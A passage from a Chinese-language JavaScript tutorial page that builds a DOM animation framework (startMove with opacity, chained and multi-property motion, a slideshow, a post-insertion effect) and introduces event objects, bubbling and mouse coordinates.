class="line">&lt;script&gt;</div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv1.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;opacity&apos;, 100);</div><div class="line">	&#125;;</div><div class="line">	oDiv1.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;opacity&apos;, 30);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">function getStyle(obj, name)</div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function startMove(obj, attr, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var cur=parseInt(getStyle(obj, attr));</div><div class="line">		</div><div class="line">		var speed=(iTarget-cur)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(cur==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			obj.style[attr]=cur+speed+&apos;px&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h3 id="扩展的运动框架"><a href="#扩展的运动框架" class="headerlink" title="扩展的运动框架"></a>扩展的运动框架</h3><ul>
<li>运动属性作为参数</li>
<li>封装opacity<br>小数的问题 Math.round() 四舍五入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">move.js</div><div class="line"></div><div class="line">&lt;style&gt;</div><div class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow; border:10px solid black; filter:alpha(opacity:30); opacity:0.3;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv1.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;opacity&apos;, 100);</div><div class="line">	&#125;;</div><div class="line">	oDiv1.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(this, &apos;opacity&apos;, 30);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">function getStyle(obj, name)</div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function startMove(obj, attr, iTarget)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var cur=0;</div><div class="line">		</div><div class="line">		if(attr==&apos;opacity&apos;)</div><div class="line">		&#123;</div><div class="line">			cur=Math.round(parseFloat(getStyle(obj, attr))*100);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			cur=parseInt(getStyle(obj, attr));</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		var speed=(iTarget-cur)/6;</div><div class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">		</div><div class="line">		if(cur==iTarget)</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			if(attr==&apos;opacity&apos;)</div><div class="line">			&#123;</div><div class="line">				obj.style.filter=&apos;alpha(opacity:&apos;+(cur+speed)+&apos;)&apos;;  //IE</div><div class="line">				obj.style.opacity=(cur+speed)/100;</div><div class="line">				// 火狐</div><div class="line">				document.getElementById(&apos;txt1&apos;).value=obj.style.opacity;</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				obj.style[attr]=cur+speed+&apos;px&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;input type=&quot;text&quot; id=&quot;txt1&quot; /&gt;</div></pre></td></tr></table></figure>
<h1 id="JS运动中级"><a href="#JS运动中级" class="headerlink" title="JS运动中级"></a>JS运动中级</h1><h2 id="链式运动框架"><a href="#链式运动框架" class="headerlink" title="链式运动框架"></a>链式运动框架</h2><p>回调函数</p>
<ul>
<li>运动停止时，执行函数</li>
<li>运动停止时，开始下一次运动<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:100px; height:100px; background:red;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script src=&quot;move.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123; </div><div class="line">		startMove(oDiv, &apos;width&apos;, 300);  //先变宽</div><div class="line">		startMove(oDiv, &apos;height&apos;, 300);	//再变长</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;iinput id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;运动&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="完美运动框架"><a href="#完美运动框架" class="headerlink" title="完美运动框架"></a>完美运动框架</h2><h3 id="多个值同时变化"><a href="#多个值同时变化" class="headerlink" title="多个值同时变化"></a>多个值同时变化</h3><p>setStyle同时设置多个属性</p>
<p>-参数传递</p>
<ul>
<li>Json的使用，实现多个属性运动</li>
<li>for in遍历属性<br>-运用到运动框架</li>
<li>检测运动停止</li>
<li>标志变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">move2.js</div><div class="line"></div><div class="line">function getStyle(obj, name)</div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">//startMove(oDiv, &#123;width: 400, height: 400&#125;)</div><div class="line"></div><div class="line"></div><div class="line">function startMove(obj, json, fnEnd)</div><div class="line">&#123;</div><div class="line">	clearInterval(obj.timer);</div><div class="line">	obj.timer=setInterval(function ()&#123;</div><div class="line">		var bStop=true;		//假设：所有值都已经到了</div><div class="line">		</div><div class="line">		for(var attr in json)</div><div class="line">		&#123;</div><div class="line">			var cur=0;</div><div class="line">			</div><div class="line">			if(attr==&apos;opacity&apos;)</div><div class="line">			&#123;</div><div class="line">				cur=Math.round(parseFloat(getStyle(obj, attr))*100);</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				cur=parseInt(getStyle(obj, attr));</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">			var speed=(json[attr]-cur)/6;</div><div class="line">			speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</div><div class="line">			</div><div class="line">			if(cur!=json[attr])</div><div class="line">				bStop=false;</div><div class="line">			</div><div class="line">			if(attr==&apos;opacity&apos;)</div><div class="line">			&#123;</div><div class="line">				obj.style.filter=&apos;alpha(opacity:&apos;+(cur+speed)+&apos;)&apos;;</div><div class="line">				obj.style.opacity=(cur+speed)/100;</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				obj.style[attr]=cur+speed+&apos;px&apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		if(bStop)    //运动完成，关闭定时器</div><div class="line">		&#123;</div><div class="line">			clearInterval(obj.timer);</div><div class="line">						</div><div class="line">			if(fnEnd)fnEnd(); //在运动结束被调用</div><div class="line">		&#125;</div><div class="line">	&#125;, 30);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="调用框架"><a href="#调用框架" class="headerlink" title="调用框架"></a>调用框架</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">#div1 &#123;width:100px; height:100px; background:red; filter:alpha(opacity:30); opacity:0.3;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;script src=&quot;move2.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		startMove(oDiv, &#123;width: 101, height: 300, opacity: 100&#125;, function ()&#123;</div><div class="line">			alert(&apos;a&apos;);</div><div class="line">		&#125;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">&lt;iinput id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;运动&quot; /&gt;</div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<h2 id="运动框架总结"><a href="#运动框架总结" class="headerlink" title="运动框架总结"></a>运动框架总结</h2><p>运动框架演变过程</p>
<ul>
<li>startMove(iTarget)            运动框架</li>
<li>startMove(obj, iTarget)            多物体</li>
<li>startMove(obj, attr, iTarget)        任意值</li>
<li>startMove(obj, attr, iTarget, fn)        链式运动</li>
<li>startMove(obj, json)            多值运动</li>
<li>startMove(obj, json, fn)        完美运动框架</li>
</ul>
<h2 id="运动框架应用"><a href="#运动框架应用" class="headerlink" title="运动框架应用"></a>运动框架应用</h2><h3 id="例子：幻灯片"><a href="#例子：幻灯片" class="headerlink" title="例子：幻灯片"></a>例子：幻灯片</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;play&apos;);</div><div class="line">	var aBtn=oDiv.getElementsByTagName(&apos;ol&apos;)[0].getElementsByTagName(&apos;li&apos;);</div><div class="line">	var oUl=oDiv.getElementsByTagName(&apos;ul&apos;)[0];</div><div class="line">	</div><div class="line">	var now=0;   //设置第一种的top值</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">	&#123;</div><div class="line">		aBtn[i].index=i;    //定义一个index来记录是第几张图</div><div class="line">		aBtn[i].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			now=this.index;         //now保存当前图片Id</div><div class="line">				</div><div class="line">			tab();					//调用tab函数</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	function tab()      //改变top值，实现幻灯片效果</div><div class="line">	&#123;</div><div class="line">		for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">		&#123;</div><div class="line">			aBtn[i].className=&apos;&apos;;   </div><div class="line">		&#125;</div><div class="line">		aBtn[now].className=&apos;active&apos;;  //使当前的button置亮</div><div class="line">		startMove(oUl, &#123;top: -150*now&#125;);  //调用move.js框架</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	function next()			//调用next函数进行自动切换</div><div class="line">	&#123;</div><div class="line">		now++; 			</div><div class="line">		if(now==aBtn.length)</div><div class="line">		&#123;</div><div class="line">			now=0;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		tab();</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	var timer=setInterval(next, 2000);  //每两秒调用next函数实现自动切换</div><div class="line">	</div><div class="line">	oDiv.onmouseover=function ()</div><div class="line">	&#123;</div><div class="line">		clearInterval(timer);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	oDiv.onmouseout=function ()</div><div class="line">	&#123;</div><div class="line">		timer=setInterval(next, 2000);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;div class=&quot;play&quot; id=&quot;play&quot;&gt;</div><div class="line">    &lt;ol&gt;</div><div class="line">    	&lt;li class=&quot;active&quot;&gt;1&lt;/li&gt;</div><div class="line">        &lt;li&gt;2&lt;/li&gt;</div><div class="line">        &lt;li&gt;3&lt;/li&gt;</div><div class="line">        &lt;li&gt;4&lt;/li&gt;</div><div class="line">        &lt;li&gt;5&lt;/li&gt;</div><div class="line">    &lt;/ol&gt;</div><div class="line">	&lt;ul&gt;</div><div class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/1.jpg&quot; alt=&quot;广告一&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</div><div class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/2.jpg&quot; alt=&quot;广告二&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</div><div class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/3.jpg&quot; alt=&quot;广告三&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</div><div class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/4.jpg&quot; alt=&quot;广告四&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</div><div class="line">		&lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/5.jpg&quot; alt=&quot;广告五&quot; /&gt;&lt;/a&gt;&lt;/li&gt;</div><div class="line">	&lt;/ul&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<h3 id="例子：微博信息发布效果"><a href="#例子：微博信息发布效果" class="headerlink" title="例子：微博信息发布效果"></a>例子：微博信息发布效果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">* &#123;margin:0; padding:0;&#125;</div><div class="line">#ul1 &#123;width:400px; height:400px; border:1px solid black; margin:10px auto; overflow:hidden;&#125;</div><div class="line">#ul1 li &#123;border-bottom:1px #999 dashed; padding:4px; list-style:none; overflow:hidden; filter:alpha(opacity:0); opacity:0;&#125;</div><div class="line">&lt;/style&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;script src=&quot;move2.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</div><div class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var oLi=document.createElement(&apos;li&apos;);  //创建元素</div><div class="line">		</div><div class="line">		oLi.innerHTML=oTxt.value;   //显示文本</div><div class="line">		oTxt.value=&apos;&apos;;</div><div class="line">		</div><div class="line">		if(oUl.children.length&gt;0)  //倒序插入</div><div class="line">		&#123;</div><div class="line">			oUl.insertBefore(oLi, oUl.children[0]);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			oUl.appendChild(oLi);</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		//运动</div><div class="line">		var iHeight=oLi.offsetHeight;  //取高度</div><div class="line">		</div><div class="line">		oLi.style.height=&apos;0&apos;;</div><div class="line">		</div><div class="line">		startMove(oLi, &#123;height: iHeight&#125;, function ()&#123;</div><div class="line">			startMove(oLi, &#123;opacity: 100&#125;);</div><div class="line">		&#125;);</div><div class="line">		//alert(iHeight);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&lt;textarea id=&quot;txt1&quot; rows=&quot;4&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;发布&quot; /&gt;</div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
<h1 id="JS事件基础"><a href="#JS事件基础" class="headerlink" title="JS事件基础"></a>JS事件基础</h1><h2 id="event对象和事件冒泡"><a href="#event对象和事件冒泡" class="headerlink" title="event对象和事件冒泡"></a>event对象和事件冒泡</h2><h3 id="event对象"><a href="#event对象" class="headerlink" title="event对象"></a>event对象</h3><p>  Event 对象代表事件的状态，比如事件在其中发生的元素、键盘按键的状态、鼠标的位置、鼠标按钮的状态。事件通常与函数结合使用，函数不会在事件发生前被执行！</p>
<h4 id="点击"><a href="#点击" class="headerlink" title="点击"></a>点击</h4><ul>
<li>直接用document.onclick</li>
<li>document.body 可能撑不开</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	document.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;a&apos;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="document"><a href="#document" class="headerlink" title="document"></a>document</h4><ul>
<li>&lt;!DOCTYPE HTML&gt;也是一个节点</li>
<li>&lt;!DOCTYPE HTML&gt;和HTML都是document的子节点</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	alert(document.childNodes[1].tagName);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="获取event对象-兼容性写法"><a href="#获取event对象-兼容性写法" class="headerlink" title="获取event对象(兼容性写法)"></a>获取event对象(兼容性写法)</h3><ul>
<li>var oEvent=ev||event;</li>
</ul>
<h4 id="点击坐标"><a href="#点击坐标" class="headerlink" title="点击坐标"></a>点击坐标</h4><ul>
<li>clientX–获取x坐标值</li>
<li>clientY–获取y坐标值</li>
<li>event 只能在IE下用</li>
<li>火狐下用ev</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	document.onclick=function (ev)</div><div class="line">	&#123;</div><div class="line">		//IE</div><div class="line">		//alert(event.clientX+&apos;,&apos;+event.clientY);</div><div class="line">		</div><div class="line">		//FF</div><div class="line">		//alert(ev.clientX+&apos;,&apos;+ev.clientY);</div><div class="line">		</div><div class="line">		var oEvent=ev||event;  //处理兼容性</div><div class="line">		</div><div class="line">		alert(oEvent.clientX+&apos;,&apos;+oEvent.clientY);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h3><h4 id="事件冒泡"><a href="#事件冒泡" class="headerlink" title="事件冒泡"></a>事件冒泡</h4><ul>
<li>事件会随着层级传给父级</li>
</ul>
<h4 id="取消冒泡"><a href="#取消冒泡" class="headerlink" title="取消冒泡"></a>取消冒泡</h4><ul>
<li>oEvent.cancelBubble=true</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:400px; height:300px; background:#CCC; display:none;&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function (ev)</div><div class="line">	&#123;</div><div class="line">		var oEvent=ev||event;</div><div class="line">		</div><div class="line">		oDiv.style.display=&apos;block&apos;;</div><div class="line">		//alert(&apos;按钮被点击了&apos;);</div><div class="line">		</div><div class="line">		oEvent.cancelBubble=true;</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	document.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		oDiv.style.display=&apos;none&apos;;</div><div class="line">		//alert(&apos;document被点击了&apos;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;input1 id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;显示&quot; /&gt;</div></pre></td></tr></table></figure>
<h2 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h2><h3 id="鼠标位置"><a href="#鼠标位置" class="headerlink" title="鼠标位置"></a>鼠标位置</h3><ul>
<li>用到client一定要用的scroll</li>
</ul>
<h4 id="可视区位置：clientX、clientY"><a href="#可视区位置：clientX、clientY" class="headerlink" title="可视区位置：clientX、clientY"></a>可视区位置：clientX、clientY</h4><ul>
<li><p>例子1：跟随鼠标的Div</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:red; position:absolute;&#125;</div><div class="line"></div><div class="line">document.onmousemove=function (ev)</div><div class="line">&#123;</div><div class="line">	var oEvent=ev||event;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oDiv.style.left=oEvent.clientX+&apos;px&apos;;</div><div class="line">	oDiv.style.top=oEvent.clientY+&apos;px&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>消除滚动条的影响</p>
